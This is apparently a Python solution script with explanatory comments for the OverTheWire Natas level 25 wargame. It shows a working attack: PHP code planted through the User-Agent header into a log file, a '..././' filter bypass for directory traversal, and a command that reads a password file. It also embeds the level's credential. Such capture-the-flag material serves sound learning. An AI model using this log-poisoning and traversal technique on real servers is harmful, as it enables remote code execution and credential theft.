#!/bin/python3

import requests
import re
import html.parser

username = 'natas25'
password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
url = 'http://%s.natas.labs.overthewire.org' % (username)

#constants
traversestr = "..././..././..././..././..././..././..././..././..././..././..././..././..././..././"
logpath = "/var/www/natas/natas25/logs/natas25_"
codeinject = '<?php passthru("cat /etc/natas_webpass/natas26"); ?>#'

data = { "lang" : "../langauge/de" }#dodgy request to get into log files
headers = { "user-agent" : codeinject }#code that is saved in the log file

#stage 1
session = requests.Session()
response = session.get(url + '' ,auth = (username,password))
cookie = response.cookies['PHPSESSID']
cookies = { "PHPSESSID" : cookie }

#stage 2
data = { "lang" : "{traversestr}{logpath}{cookie}.log".format(traversestr = traversestr,logpath = logpath, cookie=cookie) }
response = session.post(url + '' ,data =data, cookies = cookies, headers = headers, auth = (username,password))

content = response.text
print (re.findall("\[[0-9]{2}\.[0-9]{2}.[0-9]{4} [0-9]{2}::[0-9]{2}:[0-9]{2}\] (.*)\n",content)[0])


#the page calls initiates the session then calls a function setLanguage

#the function checks if a lang variable was posted 
#then calls another function safeinclude("language/['lang']")

#this checks using strstr if "../" or "natas_webpass" is conatined 
#in the ['lang'] variable and it will exit completely if the second is included
#it also checks to ensure that the file exists at all
#if all checks are passed it includes the file ready to be 
#displayed later

#in the case where a check is failed a function logRequest("log message") is called
#this will generate a string containing the data/time 
#the user agent variable which we can change
#the log message we cant change

#it then opens a file using the session_id() as part of the filename
#this value is known to us so we know the location and name of the file
#it writes the generated log string and closes the file

#seeing as we know the name and location of the log file and we can write some code into it
#using the user-agent variabel we can put some php code in the log file
#that can cat out the password for us
#then we would need to be able to traverse the directory

#the function that protects against directory traversal simply looks for any occurrences
#of "../" and swaps them with "" this means we can input ".../." instead
#once the function removes "../" from ".../." we will be left with "../" 
#so we can access our log file and have it included and the php code will run

#1) make a post request with lang variable that will get caught and make a log file
#   the log file will contain our php code to cat out the password
#2) make a second request this time masking our directory traversal 
#   and include the log file we just planted 

